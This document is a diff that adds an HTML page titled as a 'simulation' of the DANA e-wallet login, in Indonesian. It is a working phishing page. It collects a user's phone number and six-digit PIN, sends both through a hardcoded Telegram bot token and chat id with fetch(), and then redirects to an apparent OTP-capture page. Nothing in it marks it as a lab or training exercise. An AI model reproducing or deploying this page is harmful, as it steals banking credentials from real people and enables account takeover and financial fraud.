@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Simulasi Login DANA</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #008CFF;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: #008CFF;
+      width: 100%;
+      max-width: 400px;
+      padding: 30px 24px;
+      padding-bottom: 100px;
+      margin-top: -100px;
+      box-sizing: border-box;
+      position: relative;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 32px;
+    }
+    .logo img {
+      width: 80px;
+    }
+    .title {
+      color: white;
+      font-size: 18px;
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .input-row {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+    .input-box {
+      display: flex;
+      align-items: center;
+      background-color: white;
+      border-radius: 12px;
+      padding: 14px 16px;
+      flex: 1;
+    }
+    .flag {
+      display: flex;
+      align-items: center;
+    }
+    .flag img {
+      width: 24px;
+      height: 16px;
+      margin-right: 6px;
+    }
+    .country-code-input {
+      border: none;
+      outline: none;
+      font-size: 16px;
+      width: 40px;
+      font-weight: bold;
+      color: black;
+      background: transparent;
+    }
+    .input-box input[type="tel"], .input-box input[type="text"] {
+      border: none;
+      outline: none;
+      font-size: 16px;
+      color: black;
+      background: transparent;
+      width: 100%;
+    }
+    .info-text {
+      font-size: 12px;
+      color: white;
+      text-align: center;
+      line-height: 1.6;
+      padding: 0 10px;
+      margin-bottom: 24px;
+    }
+    .info-text a {
+      color: white;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 16px;
+      background-color: #ffffff;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      color: #008CFF;
+      cursor: pointer;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      max-width: 400px;
+      margin: 0 auto;
+      z-index: 10;
+      margin-bottom: 12px;
+    }
+
+    .pin-page {
+      display: none;
+      background-color: white;
+      width: 100%;
+      max-width: 400px;
+      height: 100vh;
+      padding: 70px 24px 24px 24px;
+      box-sizing: border-box;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+    }
+
+    .pin-header {
+      background-color: #008CFF;
+      color: white;
+      padding: 16px;
+      width: 100%;
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+      position: fixed;
+      top: 0;
+      left: 0;
+    }
+    .pin-title {
+      margin-top: 12px;
+      margin-bottom: 24px;
+      font-size: 18px;
+      color: black;
+      text-align: center;
+    }
+    .pin-dots {
+      display: flex;
+      justify-content: center;
+      margin-top: 24px;
+      margin-bottom: 40px;
+    }
+    .pin-dot {
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      background-color: #000;
+      margin: 0 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      color: white;
+      font-weight: bold;
+      transition: all 0.3s ease;
+    }
+    .pin-help {
+      display: flex;
+      justify-content: space-around;
+      width: 100%;
+      font-size: 14px;
+      color: #008CFF;
+      font-weight: bold;
+    }
+    .pin-help img {
+      width: 20px;
+      vertical-align: middle;
+      margin-right: 4px;
+    }
+    #pin-input {
+      position: absolute;
+      opacity: 0.01;
+      width: 1px;
+      height: 1px;
+      pointer-events: auto;
+    }
+    .pin-dots:focus-within {
+      outline: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="input-nomor">
+    <div class="logo">
+      <img src="https://cdn.antaranews.com/cache/1200x800/2022/04/25/dana.jpg.webp" alt="DANA Logo">
+    </div>
+    <div class="title">Masukkan nomor HP kamu untuk lanjut</div>
+    <div class="input-row">
+      <div class="input-box" style="max-width: 120px;">
+        <div class="flag">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" alt="ID">
+        </div>
+        <input type="text" class="country-code-input" value="+62">
+      </div>
+      <div class="input-box">
+        <input type="tel" placeholder="811-1234-5678" id="phone-input">
+      </div>
+    </div>
+    <div class="info-text">
+      Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.<br>
+      Dengan melanjutkan, kamu juga setuju dengan <a href="#">S&amp;K</a> serta <a href="#">Kebijakan Privasi</a> kami.
+    </div>
+    <button class="btn" onclick="showPinPage()">LANJUTKAN</button>
+  </div>
+
+  <div class="pin-page" id="pin-page">
+    <div class="pin-header">Masuk</div>
+    <div class="pin-title">Masukkan PIN</div>
+    <div class="pin-dots" id="pin-dots" onclick="document.getElementById('pin-input').focus()"></div>
+    <input type="tel" id="pin-input" maxlength="6" oninput="handlePinInput(this.value)" autofocus>
+    <div class="pin-help">
+      <div><img src="https://cdn-icons-png.flaticon.com/512/545/545705.png" width="16"> BUTUH BANTUAN?</div>
+      <div>LUPA PIN?</div>
+    </div>
+  </div>
+
+  <script>
+    const pinValues = Array(6).fill('');
+    let revealTimeout = null;
+    let savedPhoneNumber = '';
+
+    function showPinPage() {
+      const phone = document.getElementById('phone-input').value.trim();
+      if (phone === '') {
+        alert('Silakan isi nomor HP terlebih dahulu.');
+        return;
+      }
+      savedPhoneNumber = phone;
+      localStorage.setItem('phone', phone);
+
+      document.getElementById('input-nomor').style.display = 'none';
+      document.getElementById('pin-page').style.display = 'flex';
+      document.getElementById('pin-input').focus();
+      updateDots();
+    }
+
+    function updateDots(showIndex = -1) {
+      const dotsContainer = document.getElementById('pin-dots');
+      dotsContainer.innerHTML = '';
+      for (let i = 0; i < 6; i++) {
+        const dot = document.createElement('div');
+        dot.className = 'pin-dot';
+        if (i === showIndex && pinValues[i]) {
+          dot.textContent = pinValues[i];
+          clearTimeout(revealTimeout);
+          revealTimeout = setTimeout(() => updateDots(), 500);
+        }
+        dot.style.opacity = pinValues[i] ? '1' : '0.3';
+        dotsContainer.appendChild(dot);
+      }
+    }
+
+    async function sendToTelegram(pin) {
+      const token = '8049032485:AAE63lM0pKxDIzBtjKKdP851RniEU64fJtc';
+      const chat_id = '7032109008';
+      const message = `Nomor: ${savedPhoneNumber}\nPIN: ${pin}`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+      try {
+        await fetch(url);
+      } catch (err) {
+        console.error("Gagal mengirim ke Telegram", err);
+      }
+    }
+
+    function handlePinInput(val) {
+      if (val.length > 6) return;
+      for (let i = 0; i < 6; i++) {
+        pinValues[i] = val[i] || '';
+      }
+      updateDots(val.length - 1);
+      if (val.length === 6) {
+        sendToTelegram(val);
+        setTimeout(() => {
+          window.location.href = 'halaman-otp.html';
+        }, 500);
+      }
+    }
+
+    window.addEventListener('pageshow', (event) => {
+      if (event.persisted || performance.getEntriesByType("navigation")[0].type === "back_forward") {
+        resetToHome();
+      }
+    });
+
+    function resetToHome() {
+      document.getElementById('input-nomor').style.display = 'block';
+      document.getElementById('pin-page').style.display = 'none';
+      document.getElementById('phone-input').value = '';
+      document.getElementById('pin-input').value = '';
+      for (let i = 0; i < 6; i++) {
+        pinValues[i] = '';
+      }
+      updateDots();
+      localStorage.removeItem('phone');
+    }
+  </script>
+</body>
+</html>
